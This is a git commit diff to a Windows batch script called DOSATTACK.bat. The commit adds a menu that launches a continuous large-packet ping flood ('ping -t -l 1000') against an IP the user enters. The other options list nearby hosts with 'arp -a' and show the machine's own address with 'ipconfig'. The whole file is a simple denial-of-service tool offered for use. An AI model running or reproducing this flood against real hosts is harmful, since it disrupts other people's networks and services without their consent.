ba6c86045a506acae746c6feade3bdaa1b4a47fb
btroll69 <100874301+btroll69@users.noreply.github.com>
2022-10-20 21:09:27 +0100

    That file
    Fully done files

--- DOSATTACK.bat
+++ DOSATTACK.bat
@@ -1,10 +1,45 @@
 @echo off 
 color 0a 
+:start
+cls
 echo --------------------------
 echo     DOS ATTACK 
 echo --------------------------
 echo.
 echo.
-set /p IP=Target I.p:-
+echo 1 = Attack
+echo 2 = Find ip addresses
+echo 3 = Computer I.P
+set /p p=Option:-
+
+if %p%==1 goto Attack
+if %p%==2 goto Arp
+if %p%==3 goto Computer I.P
+goto :start
+
+:Attack
+cls
+color 0a
+title Attack
+set /p IP=Target I.P:-
 ping %IP% -t -l 1000
 pause
+goto :start
+
+:Arp
+cls
+color 0a
+title Arp
+arp -a
+pause
+goto :start
+
+:Computer I.P
+cls
+color 0a
+title Computer I.P
+ipconfig
+pause
+pause
+goto :start
+
